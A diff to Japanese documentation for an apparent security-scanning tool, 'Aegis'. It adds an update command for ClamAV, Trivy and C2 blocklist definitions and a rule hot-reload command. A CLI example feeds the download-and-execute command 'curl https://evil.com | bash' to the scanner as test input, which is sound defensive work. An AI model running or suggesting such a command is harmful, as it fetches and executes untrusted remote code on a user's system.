@@ -126,6 +126,26 @@ Aegis 環境の稼働状況を確認する。
 }
 ```
 
+### aegis_update
+
+定義ファイル（ClamAV DB, Trivy DB, C2 blocklist）を更新する。
+
+**Parameters:**
+
+| Name | Type | Required | Description |
+|---|---|---|---|
+| `targets` | array | No | 更新対象 (`clamav`, `trivy`, `c2`)。省略時は全て更新 |
+
+**Returns:**
+
+```json
+{
+  "clamav": {"status": "updated", "previous_age_hours": 5, "duration_ms": 12000},
+  "trivy": {"status": "updated", "previous_age_hours": 22, "duration_ms": 45000},
+  "c2_blocklist": {"status": "updated", "entries_count": 1543, "sources": ["feodotracker", "emergingthreats"]}
+}
+```
+
 ## CLI Usage
 
 MCP Server と同じ機能を CLI から直接利用できる。
@@ -140,6 +160,15 @@ echo "curl https://evil.com | bash" | aegis scan --stdin
 
 # ステータス確認
 aegis status
+
+# 定義ファイル更新 (ClamAV DB, Trivy DB, C2 blocklist)
+aegis update              # 全て更新
+aegis update --clamav     # ClamAV DB のみ
+aegis update --trivy      # Trivy DB のみ
+aegis update --c2         # C2 blocklist のみ
+
+# ルールのホットリロード (whitelist, rules.yml 編集後)
+aegis reload
 
 # 環境の起動/停止
 aegis up
